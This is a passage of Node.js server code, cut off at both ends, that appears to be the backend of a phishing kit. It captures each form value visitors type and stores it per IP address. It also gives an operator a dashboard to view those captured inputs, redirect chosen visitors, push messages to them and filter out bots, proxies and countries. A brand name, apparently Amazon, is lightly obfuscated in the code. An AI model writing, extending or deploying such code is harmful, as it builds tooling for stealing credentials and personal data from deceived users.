      console.log(`Ignoring input data from blacklisted IP: ${clientIP} - cache was previously deleted`);
      return; // Skip processing this input data
    }
    
    // Validate the client IP
    if (!isValidPublicIP(clientIP)) {
      console.warn(`Received invalid client IP in input data: ${clientIP}`);
      return;
    }
    
    // If this is from ipify.org, update the accurate client IP mapping
    if (isFromIpify) {
      // Store mapping between socket IP and accurate client IP
      accurateClientIPs.set(socketIP, {
        clientIP: clientIP,
        timestamp: new Date().toISOString(),
        source: 'ipify.org',
        socketId: socket.id
      });
    }
    
    // Create a standardized input data object with property names matching what the dashboard expects
    const inputDataForCache = {
      ip: clientIP,
      path: data.path || '/',
      inputName: data.name,
      inputType: data.type,
      inputValue: data.value,
      timestamp: data.timestamp || new Date().toISOString(),
      source: source
    };
    
    // Store input data in cache using the accurate client IP
    if (!inputDataCache.has(clientIP)) {
      inputDataCache.set(clientIP, []);
    }

    const inputDataArray = inputDataCache.get(clientIP);
    
    // Check for duplicates before adding new input data
    // Consider input as duplicate if it has the same name, type, value and was submitted within 2 seconds
    const isDuplicate = inputDataArray.some(existingInput => {
      const sameInputName = existingInput.inputName === inputDataForCache.inputName || 
                           (existingInput.name === inputDataForCache.inputName);
      const sameInputType = existingInput.inputType === inputDataForCache.inputType || 
                           (existingInput.type === inputDataForCache.inputType);
      const sameInputValue = existingInput.inputValue === inputDataForCache.inputValue || 
                           (existingInput.value === inputDataForCache.inputValue);
      
      // Check if timestamps are within 2 seconds of each other
      const existingTime = new Date(existingInput.timestamp).getTime();
      const newTime = new Date(inputDataForCache.timestamp).getTime();
      const timeWithinThreshold = Math.abs(existingTime - newTime) < 2000; // 2 seconds threshold
      
      return sameInputName && sameInputType && sameInputValue && timeWithinThreshold;
    });
    
    // Only add if not a duplicate
    if (!isDuplicate) {
      inputDataArray.push(inputDataForCache);
      console.log('New input data added to cache');
    } else {
      console.log('Duplicate input data detected and skipped');
    }

    // Limit stored input data to 50 entries per IP
    if (inputDataArray.length > 50) {
      inputDataArray.shift();
    }

    // Update cache with the accurate client IP
    inputDataCache.set(clientIP, inputDataArray);

    // Visitor data tracking 
    const visitorData = ipCache.get(clientIP) || ipCache.get(socketIP);
    
    if (visitorData) {
      // Update the visitor data with the accurate client IP if needed
      if (!visitorData.accurateIP || (isFromIpify && visitorData.accurateIP !== clientIP)) {
        visitorData.accurateIP = clientIP;
        visitorData.ipSource = isFromIpify ? 'ipify.org' : source;
        ipCache.set(clientIP, visitorData);
      }
      
      // Log input data received with source information and actual input value
      console.log(`Input data received from ${clientIP} (source: ${source}) on path ${data.path || '/'}`);
      console.log(`Input value: "${data.value}", Type: ${data.type}, Name: ${data.name}`);
      
      // Update cache with the accurate client IP
      ipCache.set(clientIP, visitorData);
    }
    
    // Emit dashboard update to refresh the input monitoring tab
    io.emit('input-data-update');
  });

  // Handle client disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    
    // Find the accurate IP associated with this socket
    let clientIP = socketIP;
    let foundMapping = false;
    
    // Search through the accurateClientIPs map to find the accurate IP for this socket
    for (const [apparentIP, mapping] of accurateClientIPs.entries()) {
      if (mapping.socketId === socket.id) {
        clientIP = mapping.clientIP;
        foundMapping = true;
        console.log(`Found accurate IP mapping for disconnected socket: ${clientIP}`);
        break;
      }
    }
    
    // If no mapping was found, use the socket's apparent IP
    if (!foundMapping) {
      console.log(`No accurate IP mapping found for disconnected socket, using apparent IP: ${socketIP}`);
    }
    
    // Update the user's status to offline
    trackIPStatus(clientIP, false, socket.id);
    
    // Emit dashboard update if needed
    io.emit('dashboard-update');
  });
  
  // Handle proxy detection toggle
  socket.on('update-proxy-detection', (data) => {
    console.log('Proxy detection update received:', data);
    
    if (data && typeof data.enabled === 'boolean') {
      // Update global setting
      globalSettings.proxyDetectionEnabled = data.enabled;
      console.log(`Proxy detection ${data.enabled ? 'enabled' : 'disabled'} by admin`);
      
      // Emit confirmation to all dashboard clients
      io.emit('proxy-detection-toggled', {
        success: true,
        enabled: data.enabled,
        timestamp: Date.now()
      });
    }
  });
  
  // Set to track IPs that have had their input data cache deleted
  // These IPs will not receive new input data updates
  if (!global.inputDataBlacklist) {
    global.inputDataBlacklist = new Set();
  }
  
  // Load the input data blacklist from persistent storage
  try {
    if (fs.existsSync(INPUT_DATA_BLACKLIST_FILE)) {
      const blacklistArray = JSON.parse(fs.readFileSync(INPUT_DATA_BLACKLIST_FILE, 'utf8'));
      blacklistArray.forEach(ip => {
        global.inputDataBlacklist.add(ip);
      });
      console.log(`Loaded ${blacklistArray.length} blacklisted IPs from ${INPUT_DATA_BLACKLIST_FILE}`);
    } else {
      console.log(`No input data blacklist file found at ${INPUT_DATA_BLACKLIST_FILE}, starting with empty set`);
    }
  } catch (error) {
    console.error('Error loading input data blacklist:', error);
  }
  
  // Handle delete input data cache event for a specific IP
  socket.on('delete-input-data-cache', (data) => {
    const ip = data.ip;
    if (!ip) {
      socket.emit('input-data-cache-deleted', { success: false, error: 'No IP provided' });
      return;
    }
    
    const forceDelete = data.forceDelete === true;
    const deleteFromCapture = data.deleteFromCapture === true;
    
    console.log(`HARD DELETE: Completely purging all input data cache for IP: ${ip} (Force: ${forceDelete}, DeleteFromCapture: ${deleteFromCapture})`);
    
    try {
      // Add the IP to the blacklist to prevent future input data updates
      global.inputDataBlacklist.add(ip);
      
      // Save the blacklist to a persistent file
      try {
        const blacklistArray = Array.from(global.inputDataBlacklist);
        fs.writeFileSync(INPUT_DATA_BLACKLIST_FILE, JSON.stringify(blacklistArray, null, 2));
        console.log(`Saved ${blacklistArray.length} blacklisted IPs to ${INPUT_DATA_BLACKLIST_FILE}`);
      } catch (saveError) {
        console.error('Error saving input data blacklist:', saveError);
      }
      
      console.log(`Added IP ${ip} to input data blacklist - will not receive new input data updates`);
      
      // COMPLETELY REMOVE input data from inputDataCache
      if (inputDataCache.has(ip)) {
        // Delete the entry entirely instead of just clearing the array
        inputDataCache.delete(ip);
        console.log(`Input data completely purged from inputDataCache for IP: ${ip}`);
      } else {
        console.log(`No input data found in inputDataCache for IP: ${ip}`);
      }
      
      // Clear input data from visitorCache/ipCache if it exists
      if (ipCache.has(ip)) {
        const visitorData = ipCache.get(ip);
        if (visitorData) {
          // Remove inputs property entirely
          if (visitorData.inputs) {
            delete visitorData.inputs;
            console.log(`Input data property removed from visitor cache for IP: ${ip}`);
          }
          
          // Also remove any other input-related properties
          if (visitorData.inputData) delete visitorData.inputData;
          if (visitorData.formData) delete visitorData.formData;
          if (visitorData.formInputs) delete visitorData.formInputs;
          
          ipCache.set(ip, visitorData);
        }
      }
      
      // Check visitorMetadata map to ensure we preserve visitor information
      if (visitorMetadata && typeof visitorMetadata.has === 'function' && visitorMetadata.has(ip)) {
        const visitor = visitorMetadata.get(ip);
        if (visitor) {
          // Remove only input-related properties while preserving visitor metadata
          if (visitor.inputs) delete visitor.inputs;
          if (visitor.inputData) delete visitor.inputData;
          if (visitor.formData) delete visitor.formData;
          if (visitor.formInputs) delete visitor.formInputs;
          
          // Make sure essential visitor metadata is preserved
          const preservedVisitor = {
            ...visitor,
            // Ensure these fields are always present
            ip: ip,
            browser: visitor.browser || 'Unknown',
            os: visitor.os || 'Unknown',
            device: visitor.device || 'Unknown',
            country: visitor.country || 'Unknown',
            city: visitor.city || 'Unknown',
            org: visitor.org || 'Unknown',
            isp: visitor.isp || 'Unknown',
            proxy: visitor.proxy || false,
            firstSeen: visitor.firstSeen || new Date().toISOString(),
            lastActivity: visitor.lastActivity || new Date().toISOString()
          };
          
          // Update the visitor metadata
          visitorMetadata.set(ip, preservedVisitor);
          console.log(`Input data properties removed while preserving visitor metadata for IP: ${ip}`);
          
          // Log the preserved visitor metadata for debugging
          console.log(`Preserved visitor metadata for IP ${ip}:`, preservedVisitor);
        }
      }
      
      // Check if we need to delete from captured data storage
      if (deleteFromCapture) {
        // Delete from any additional input data capture storage
        try {
          // Delete from any database or additional storage that might contain input data
          // This ensures complete removal from all possible storage locations
          
          // Example: If you have a capturedInputs collection/map
          if (global.capturedInputs && global.capturedInputs.has(ip)) {
            global.capturedInputs.delete(ip);
            console.log(`Deleted input data from captured storage for IP: ${ip}`);
          }
          
          // Example: If you store in a database (pseudocode)
          // await db.collection('capturedInputs').deleteMany({ ip: ip });
          
          // Clean up any other potential storage locations
          // This is a catch-all to ensure complete deletion from ALL possible locations
          Object.keys(global).forEach(key => {
            if (global[key] && typeof global[key] === 'object' && global[key][ip] && 
                (key.toLowerCase().includes('input') || key.toLowerCase().includes('capture'))) {
              try {
                delete global[key][ip];
                console.log(`Deleted input data from global.${key} for IP: ${ip}`);
              } catch (e) {
                console.warn(`Failed to delete from global.${key}:`, e.message);
              }
            }
          });
        } catch (captureError) {
          console.error(`Error deleting from captured data for IP ${ip}:`, captureError);
          // Continue with the process even if this specific part fails
        }
      }
      
      // Broadcast update to all dashboard clients to refresh their data
      io.emit('input-data-update', { ip });
      
      // Also broadcast a specific event for input data capture deletion
      if (deleteFromCapture) {
        io.emit('input-data-capture-deleted', { ip });
      }
      
      // Send confirmation to the client
      socket.emit('input-data-cache-deleted', { 
        ip, 
        success: true,
        deletedFromCapture: deleteFromCapture
      });
      
      console.log(`All input data successfully removed for IP: ${ip} (including captured data: ${deleteFromCapture})`);
      
      // Force garbage collection if possible to ensure memory is freed
      if (forceDelete && global.gc) {
        try {
          global.gc();
          console.log('Forced garbage collection after input data deletion');
        } catch (e) {
          console.warn('Failed to force garbage collection:', e.message);
        }
      }
    } catch (error) {
      console.error(`Error deleting input data cache for IP ${ip}:`, error);
      socket.emit('input-data-cache-deleted', { ip, success: false, error: error.message });
    }
  });
  
  // Handle delete ALL input data cache event
  socket.on('delete-all-input-data-cache', () => {
    console.log('Deleting ALL input data cache');
    
    try {
      // Clear the entire inputDataCache
      inputDataCache.clear();
      console.log('Input data cache completely cleared');
      
      // Remove input data properties from all visitor entries
      for (const [ip, visitor] of ipCache.entries()) {
        if (visitor) {
          // Remove all input-related properties
          if (visitor.inputs) delete visitor.inputs;
          if (visitor.inputData) delete visitor.inputData;
          if (visitor.formData) delete visitor.formData;
          if (visitor.formInputs) delete visitor.formInputs;
          
          ipCache.set(ip, visitor);
        }
      }
      console.log('Input data removed from all visitor entries');
      
      // If visitorData is separate from ipCache, clear that too
      if (visitorData && typeof visitorData.forEach === 'function') {
        visitorData.forEach((visitor, ip) => {
          if (visitor) {
            if (visitor.inputs) delete visitor.inputs;
            if (visitor.inputData) delete visitor.inputData;
            if (visitor.formData) delete visitor.formData;
            if (visitor.formInputs) delete visitor.formInputs;
            
            visitorData.set(ip, visitor);
          }
        });
        console.log('Input data removed from all entries in visitorData');
      }
      
      // Broadcast update to all dashboard clients
      io.emit('input-data-update');
      
      // Send confirmation to the client
      socket.emit('all-input-data-cache-deleted', { success: true });
      
      console.log('ALL input data successfully removed from all caches');
    } catch (error) {
      console.error('Error deleting all input data cache:', error);
      socket.emit('all-input-data-cache-deleted', { success: false, error: error.message });
    }
  });
  
  // Send proxy detection status on connection
  socket.emit('proxy-detection-status', {
    enabled: globalSettings.proxyDetectionEnabled
  });
});

let target = "A-1M-1A-1Z-1O"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "A-1M-1A-1Z-1O"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");

// Add JSON middleware to parse request bodies
app.use(express.json());

// Dashboard routes
app.get('/dashboard/country-filters', (req, res) => {
  res.json(countryFilterSettings);
});

app.post('/dashboard/redirect-ip', (req, res) => {
  const { ip, redirectUrl, isPermanent } = req.body;
  
  if (!ip || !redirectUrl) {
    return res.status(400).json({ success: false, error: 'Missing required parameters' });
  }
  
  // Store the redirect settings for this IP
  ipRedirectSettings.set(ip, {
    redirectUrl,
    isPermanent: isPermanent || false,
    createdAt: new Date().toISOString()
  });
  
  console.log(`IP ${ip} will be redirected to ${redirectUrl} (${isPermanent ? 'permanent' : 'temporary'})`);
  
  // Emit event to notify all clients
  io.emit('ip-redirect-update', { ip, redirectUrl });
  
  res.json({ success: true });
});

app.post('/dashboard/country-filters', (req, res) => {
  const { mode, country, action } = req.body;
  
  // Update filter mode if provided
  if (mode && (mode === 'block' || mode === 'allow')) {
    countryFilterSettings.mode = mode;
  }
  
  // Add or remove country if provided
  if (country && action) {
    if (action === 'add') {
      if (mode === 'block' && !countryFilterSettings.blockedCountries.includes(country)) {
        countryFilterSettings.blockedCountries.push(country);
      } else if (mode === 'allow' && !countryFilterSettings.allowedCountries.includes(country)) {
        countryFilterSettings.allowedCountries.push(country);
      }
    } else if (action === 'remove') {
      if (mode === 'block') {
        countryFilterSettings.blockedCountries = countryFilterSettings.blockedCountries.filter(c => c !== country);
      } else if (mode === 'allow') {
        countryFilterSettings.allowedCountries = countryFilterSettings.allowedCountries.filter(c => c !== country);
      }
    }
  }
  
  // Emit update to all connected clients
  io.emit('country-filter-update', countryFilterSettings);
  
  res.json({ success: true, settings: countryFilterSettings });
});

// Endpoint to send messages to clients
app.post('/dashboard/send-message', (req, res) => {
  const { message, type, title, duration, targetIP } = req.body;
  
  if (!message) {
    return res.status(400).json({ success: false, error: 'Message content is required' });
  }
  
  // Create message object
  const messageObj = {
    content: message,
    type: type || 'info',
    duration: duration || 10
  };
  
  // Add title if provided
  if (title) {
    messageObj.title = title;
  }
  
  // Require a target IP - no more broadcasting to all clients
  if (!targetIP) {
    return res.status(400).json({ success: false, error: 'Target IP is required' });
  }
  
  console.log(`Sending message to client: ${targetIP}:`, messageObj);
  
  // Find sockets associated with this IP
  // Use a Set to ensure we only have unique socket IDs
  const uniqueSocketIds = new Set();
  for (const [apparentIP, mapping] of accurateClientIPs.entries()) {
    if (mapping.clientIP === targetIP) {
      uniqueSocketIds.add(mapping.socketId);
    }
  }
  
  const socketIds = Array.from(uniqueSocketIds);
  
  if (socketIds.length > 0) {
    // Send message to each unique socket (only once per socket)
    socketIds.forEach(socketId => {
      io.to(socketId).emit('client-message', messageObj);
    });
    res.json({ success: true, recipients: socketIds.length });
  } else {
    res.status(404).json({ success: false, error: 'No active connections found for this IP' });
  }
});

// Endpoint to get details for a specific IP address
app.get('/dashboard/ip/:ip', (req, res) => {
  const ip = req.params.ip;
  
  if (!ip) {
    return res.status(400).json({ error: 'IP address is required' });
  }
  
  // Find visitor data for this IP
  const visitorData = ipCache.get(ip);
  
  if (!visitorData) {
    return res.status(404).json({ error: 'IP not found' });
  }
  
  // Check if this IP has a redirect setting
  const hasRedirect = ipRedirectSettings.has(ip);
  const redirectInfo = hasRedirect ? ipRedirectSettings.get(ip) : null;
  
  // Calculate additional metrics
  const firstSeen = visitorData.firstSeen ? new Date(visitorData.firstSeen) : new Date();
  const lastSeen = visitorData.lastRequest ? new Date(visitorData.lastRequest) : 
                   visitorData.lastSeen ? new Date(visitorData.lastSeen) : new Date();
  const sessionDuration = lastSeen - firstSeen;
  const now = new Date();
  const minutesSinceLastSeen = Math.floor((now - lastSeen) / 60000);
  
  // Extract and analyze headers if available
  const headers = visitorData.headers || {};
  const acceptLanguage = headers['accept-language'] || '';
  const languages = acceptLanguage.split(',').map(lang => lang.trim().split(';')[0]);
  const primaryLanguage = languages[0] || 'Unknown';
  
  // Analyze referrer if available
  const referrer = headers['referer'] || headers['referrer'] || '';
  let referrerSource = 'Direct';
  let referrerDomain = '';
  
  if (referrer) {
    try {
      const referrerUrl = new URL(referrer);
      referrerDomain = referrerUrl.hostname;
      
      // Identify common referrer sources
      if (referrerDomain.includes('google')) {
        referrerSource = 'Google';
      } else if (referrerDomain.includes('facebook')) {
        referrerSource = 'Facebook';
      } else if (referrerDomain.includes('twitter') || referrerDomain.includes('x.com')) {
        referrerSource = 'Twitter';
      } else if (referrerDomain.includes('instagram')) {
        referrerSource = 'Instagram';
      } else if (referrerDomain.includes('linkedin')) {
        referrerSource = 'LinkedIn';
      } else if (referrerDomain.includes('bing')) {
        referrerSource = 'Bing';
      } else if (referrerDomain.includes('yahoo')) {
        referrerSource = 'Yahoo';
      } else {
        referrerSource = 'External Website';
      }
    } catch (e) {
      // Invalid URL format
      referrerSource = 'Unknown';
    }
  }
  
  // Return detailed information about this IP
  res.json({
    // Basic IP information
    ip: visitorData.ip,
    country: visitorData.country,
    countryCode: visitorData.countryCode?.toLowerCase(),
    city: visitorData.city || '',
    region: visitorData.regionName || '',
    timezone: visitorData.timezone || '',
    isp: visitorData.isp || '',
    org: visitorData.org || '',
    ipSource: visitorData.ipSource || 'unknown',
    
    // Redirect information
    hasRedirect: hasRedirect,
    redirectUrl: redirectInfo ? redirectInfo.redirectUrl : null,
    redirectType: redirectInfo ? (redirectInfo.isPermanent ? 'permanent' : 'temporary') : null,
    
    // Status information
    lastSeen: visitorData.lastRequest || visitorData.lastSeen,
    isOnline: visitorData.isOnline || false,
    isBot: visitorData.isBot || false,
    isProxy: visitorData.proxy || false,
    isBlocked: false, // Implement based on your blocking logic
    
    // Device and browser information
    userAgent: visitorData.userAgent,
    browser: visitorData.browser,
    os: visitorData.os,
    device: visitorData.device,
    
    // Visit statistics
    visits: visitorData.visits || 1,
    firstSeen: visitorData.firstSeen,
    sessionDuration: sessionDuration,
    minutesSinceLastSeen: minutesSinceLastSeen,
    
    // Header information
    headers: visitorData.headers || {},
    acceptLanguage: acceptLanguage,
    primaryLanguage: primaryLanguage,
    languages: languages,
    
    // Referrer information
    referrer: referrer,
    referrerSource: referrerSource,
    referrerDomain: referrerDomain,
    
    // Additional technical details
    latitude: visitorData.lat,
    longitude: visitorData.lon,
    zipCode: visitorData.zip,
    asn: visitorData.as,
    mobile: visitorData.mobile || false,
    hostName: visitorData.reverse || '',
    
    // Page view information
    currentPage: visitorData.currentPage || '/',
    landingPage: visitorData.landingPage || '/',
    pagesViewed: visitorData.pagesViewed || []
  });
});

// IP Redirect endpoint to set redirect for specific IPs
app.post('/dashboard/redirect', (req, res) => {
  const { ip, redirectUrl, isPermanent } = req.body;
  
  if (!ip || !redirectUrl) {
    return res.status(400).json({ success: false, error: 'IP and redirect URL are required' });
  }
  
  // Ensure URL has protocol
  let finalUrl = redirectUrl;
  if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
    finalUrl = 'https://' + finalUrl;
  }
  
  // Save the redirect setting
  ipRedirectSettings.set(ip, {
    redirectUrl: finalUrl,
    isPermanent: isPermanent === true
  });
  
  console.log(`Set redirect for IP ${ip} to ${finalUrl} (${isPermanent ? 'permanent' : 'temporary'})`);
  
  res.json({ success: true });
});

// Remove IP redirect endpoint
app.post('/dashboard/remove-redirect', (req, res) => {
  const { ip } = req.body;
  
  if (!ip) {
    return res.status(400).json({ success: false, error: 'IP is required' });
  }
  
  // Remove the redirect setting if it exists
  if (ipRedirectSettings.has(ip)) {
    ipRedirectSettings.delete(ip);
    console.log(`Removed redirect for IP ${ip}`);
    res.json({ success: true });
  } else {
    res.json({ success: false, error: 'No redirect found for this IP' });
  }
});

// GET endpoint for input data for a specific IP
app.get('/dashboard/input-data/:ip', (req, res) => {
  const ip = req.params.ip;
  
  if (!ip) {
    return res.status(400).json({ success: false, error: 'IP parameter is required' });
  }
  
  // Get input data for this IP
  const inputData = inputDataByIP.get(ip) || [];
  
  // Return the input data
  res.json({
    success: true,
    ip: ip,
    inputData: inputData
  });
});

// DELETE endpoint to clear input data for a specific IP
app.delete('/dashboard/input-data/:ip', (req, res) => {
  const ip = req.params.ip;
  
  if (!ip) {
    return res.status(400).json({ success: false, error: 'IP parameter is required' });
  }
  
  // Check if there's data to delete
  if (!inputDataByIP.has(ip)) {
    return res.status(404).json({ success: false, error: 'No input data found for this IP' });
  }
  
  // Delete input data for this IP
  inputDataByIP.delete(ip);
  
  console.log(`Deleted input data cache for IP ${ip}`);
  
  // Return success
  res.json({
    success: true,
    message: `Input data for IP ${ip} has been deleted`
  });
});

app.get('/dashboard/visitors', (req, res) => {
  // Convert visitor data to array format for the dashboard
  const visitors = Array.from(ipCache.entries()).map(([ip, visitor]) => {
    // Check if this IP has a redirect setting
    const hasRedirect = ipRedirectSettings.has(ip);
    const redirectInfo = hasRedirect ? ipRedirectSettings.get(ip) : null;
    
    // Ensure IP is always included
    return {
      ip: ip || visitor.ip || 'unknown',
      country: visitor.country,
      countryCode: visitor.countryCode?.toLowerCase(),
      city: visitor.city || '',
      region: visitor.regionName || '',
      isp: visitor.isp || '',
      lastSeen: visitor.lastRequest || visitor.lastSeen,
      firstSeen: visitor.firstSeen || visitor.lastSeen,
      isOnline: visitor.isOnline || false,
      isBot: visitor.isBot || false,
      isProxy: visitor.proxy || false,
      isBlocked: false, // You can implement this based on your blocking logic
      userAgent: visitor.userAgent,
      browser: visitor.browser || '',
      os: visitor.os || '',
      device: visitor.device || '',
      visits: visitor.visits || 1,
      ipSource: visitor.ipSource || 'unknown',
      hasRedirect: hasRedirect,
      redirectUrl: redirectInfo ? redirectInfo.redirectUrl : null,
      redirectType: redirectInfo ? (redirectInfo.isPermanent ? 'permanent' : 'temporary') : null
    };
  });
  
  // Calculate stats
  const stats = {
    totalVisitors: visitors.length,
    botsDetected: visitors.filter(v => v.isBot).length,
    proxyCount: visitors.filter(v => v.isProxy).length,
    blockedCount: 0 // Implement this based on your blocking logic
  };
  
  res.json({ visitors, stats });
});

// PORT - defined at the top level to avoid duplicate declarations
let PORT = process.env.PORT || 5000

//use:
app.use(session({
  secret: process.env.SECRET,
  resave: false,
  saveUninitialized: true,
}));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());



// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

//set:
app.set('view engine', 'ejs');

/////////////////[FUNCTION]//(blocker)//////////////

// Maps for tracking data
const ipCache = new Map(); // Store IP data and status (online/offline)
const geoDataCache = new Map(); // Store geo data to reduce API calls
const visitorData = new Map(); // Store visitor data
const accurateClientIPs = new Map(); // Store accurate client IPs from tracker.js

// Create a Map to store input data
const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects

// Track active sockets by IP address
const activeSocketsByIP = new Map(); // Key: IP, Value: Set of socket IDs

// Global settings already defined above

// Our enhanced IP blocking functions are defined above

// IP blocking functions are defined above

// Parse User Agent function
function parseUserAgent(userAgent) {
  if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };

  // Browser detection
  let browser = 'Unknown';
  if (userAgent.includes('Firefox/')) {
    browser = 'Firefox';
  } else if (userAgent.includes('Chrome/') && !userAgent.includes('Edg/') && !userAgent.includes('OPR/')) {
    browser = 'Chrome';
  } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) {
    browser = 'Safari';
  } else if (userAgent.includes('Edg/')) {
    browser = 'Edge';
  } else if (userAgent.includes('OPR/') || userAgent.includes('Opera/')) {
    browser = 'Opera';
  } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
    browser = 'Internet Explorer';
  }

  // OS detection
  let os = 'Unknown';
  if (userAgent.includes('Windows')) {
    os = 'Windows';
  } else if (userAgent.includes('Macintosh') || userAgent.includes('Mac OS')) {
    os = 'macOS';
  } else if (userAgent.includes('Linux') && !userAgent.includes('Android')) {
    os = 'Linux';
  } else if (userAgent.includes('Android')) {
    os = 'Android';
  } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) {
    os = 'iOS';
  }

  return { browser, os };
}



const REAL_ROUTES = [
  "/",
  '/QcEwP85AgNE4pnL5mWSM',
  '/RKnUB922z6Mf4HDwg3EZ',
  '/LGknmeM9HwWUWSutj6mJ',
  '/PPmP85AgNE4pnL5mWSM',
  '/LkaaomeM9HwWU472fgsPr',
  '/PrTomeM9HwWUWSulkTe4',
  '/Ose4aQeM9H4waRfs7PrTv'
];

// Helper functions for visitor tracking
// Note: isLocalIP function is already defined above, using that implementation instead
/* Original code was:
const isLocalIP = (ip) => {
  return ip === '127.0.0.1' ||
    ip === 'localhost' ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.') ||
    ip.startsWith('172.16.') ||
    ip.startsWith('172.17.') ||
    ip.startsWith('172.18.') ||
    ip.startsWith('172.19.') ||
    ip.startsWith('172.2') ||
    ip.startsWith('172.30.') ||
    ip.startsWith('172.31.') ||
    ip.startsWith('::1') ||
    ip.startsWith('::ffff:127.0.0.1') ||
    ip.startsWith('fc00:') || // Unique local addresses
    ip.startsWith('fd');
};
*/

const isSystemPath = (path) => {
  return path.startsWith('/dashboard') ||
    path.startsWith('/socket.io') ||
    path.startsWith('/api') ||
    path.startsWith('/public') ||
    path.startsWith('/assets') ||
    path.startsWith('/css') ||
    path.startsWith('/js') ||
    path.startsWith('/img') ||
    path.startsWith('/favicon');
};

/**
 * Function to emit redirect events to specific IP addresses
 * @param {string} ip - The IP address to redirect
 * @param {string} url - The URL to redirect to
 * @returns {boolean} - Whether the redirect was sent successfully
 */
const emitRedirect = (ip, url) => {
  console.log(`Attempting to redirect IP ${ip} to ${url}`);
  
  // Check if the IP has any active sockets using our tracking map
  if (activeSocketsByIP.has(ip) && activeSocketsByIP.get(ip).size > 0) {
    const activeSockets = activeSocketsByIP.get(ip);
    console.log(`Found ${activeSockets.size} active socket(s) for IP ${ip}`);
    
    // Get all socket objects for this IP
    const socketObjects = [];
    activeSockets.forEach(socketId => {
      const socket = io.sockets.sockets.get(socketId);
      if (socket) {
        socketObjects.push(socket);
      }
    });
    
    if (socketObjects.length > 0) {
      // Send redirect event to all active sockets with this IP
      socketObjects.forEach(socket => {
        console.log(`Sending redirect to socket ${socket.id} for IP ${ip}`);
        socket.emit('redirect', { ip, url });
      });
      return true;
    }
  }
  
  console.log(`No active sockets found for IP ${ip}`);
  return false;
};

// Using the geoDataCache defined above

// Helper function to get geolocation data with caching and enhanced proxy detection
async function getGeoData(ip) {
  // Skip for localhost and private IPs
  if (isLocalIP(ip)) {
    return { 
      country: 'Local', 
      countryCode: 'LO', 
      city: 'Local Network',
      proxy: false,
      hosting: false,
      proxyScore: 0,
      proxyDetail: 'Local IP'
    };
  }

  // Check if we have cached data that's not expired
  const cacheExpiry = 6 * 60 * 60 * 1000; // 6 hours in milliseconds
  if (geoDataCache.has(ip)) {
    const cachedData = geoDataCache.get(ip);
    // Only use cache if it has timestamp and is not expired
    if (cachedData.timestamp && (Date.now() - cachedData.timestamp) < cacheExpiry) {
      return cachedData;
    }
  }

  // Initialize result with default values
  let geoData = {
    country: 'Unknown',
    countryCode: 'XX',
    city: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    proxy: false,
    hosting: false,
    proxyScore: 0,
    proxyDetail: '',
    timestamp: Date.now()
  };

  try {
    console.log(`Fetching geo data for ${ip} from ip-api.com`);
    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=66842623`, {
      timeout: 3000 // 3 second timeout
    });
    const data = response.data;

    if (data.status === 'success') {
      // Update geo data with API response
      geoData = {
        country: data.country || 'Unknown',
        countryCode: data.countryCode || 'XX',
        city: data.city || 'Unknown',
        region: data.regionName || 'Unknown',
        lat: data.lat,
        lon: data.lon,
        isp: data.isp || 'Unknown',
        org: data.org || 'Unknown',
        proxy: Boolean(data.proxy),
        hosting: Boolean(data.hosting),
        proxyScore: 0,
        proxyDetail: '',
        timestamp: Date.now()
      };

      // Enhanced proxy detection logic
      let proxyScore = 0;
      const proxyReasons = [];

      // 1. Direct proxy/VPN detection from API
      if (data.proxy) {
        proxyScore += 70;
        proxyReasons.push('Proxy/VPN detected');
      }

      // 2. Hosting provider detection
      if (data.hosting) {
        proxyScore += 30;
        proxyReasons.push('Hosting provider detected');
      }

      // 3. ISP/Organization analysis
      const ispOrgText = `${data.isp || ''} ${data.org || ''}`.toLowerCase();
      const proxyKeywords = ['vpn', 'proxy', 'tor', 'exit node', 'anonymous', 'hide my', 'private internet'];
      const hostingKeywords = ['host', 'cloud', 'server', 'data center', 'datacenter', 'vps', 'virtual private server'];
      
      // Check for proxy keywords
      for (const keyword of proxyKeywords) {
        if (ispOrgText.includes(keyword)) {
          proxyScore += 40;
          proxyReasons.push(`ISP/Org contains proxy keyword: ${keyword}`);
          break;
        }
      }
      
      // Check for hosting keywords
      for (const keyword of hostingKeywords) {
        if (ispOrgText.includes(keyword)) {
          proxyScore += 20;
          proxyReasons.push(`ISP/Org indicates hosting service`);
          break;
        }
      }

      // 4. High-risk countries for proxies
      const highRiskCountries = ['RU', 'VG', 'SC', 'PA', 'CY', 'BZ', 'KY', 'BS', 'HK'];
      if (highRiskCountries.includes(data.countryCode)) {
        proxyScore += 15;
        proxyReasons.push(`High-risk country: ${data.country}`);
      }

      // 5. Port analysis if available
      if (data.port && (data.port === 80 || data.port === 443 || data.port === 8080 || data.port === 3128)) {
        proxyScore += 10;
        proxyReasons.push(`Connection via common proxy port: ${data.port}`);
      }

      // Normalize score to 0-100 range
      proxyScore = Math.min(100, proxyScore);
      
      // Update final proxy status based on score threshold
      geoData.proxyScore = proxyScore;
      geoData.proxyDetail = proxyReasons.join('; ');
      
      // If score is high enough, mark as proxy regardless of API flag
      if (proxyScore >= 70) {
        geoData.proxy = true;
      }

      console.log(`Proxy detection for ${ip}: Score=${proxyScore}, IsProxy=${geoData.proxy}, Details=${geoData.proxyDetail}`);
    }
  } catch (error) {
    console.error(`Error fetching geo data from ip-api.com for ${ip}:`, error.message);
    
    // Try fallback API if primary fails
    try {
      console.log(`Trying fallback geo API for ${ip}`);
      // Implement fallback API call here if needed
      // For example: ipinfo.io, ipdata.co, or ipgeolocation.io
    } catch (fallbackError) {
      console.error(`Fallback geo API also failed for ${ip}:`, fallbackError.message);
    }
  }

  // Cache the result
  geoDataCache.set(ip, geoData);
  return geoData;
}

// Helper function to check if an IP is a local/private IP
function isLocalIP(ip) {
  if (!ip) return true;
  
  // Check for localhost and common private IP ranges
  return ip === '127.0.0.1' || 
         ip === 'localhost' || 
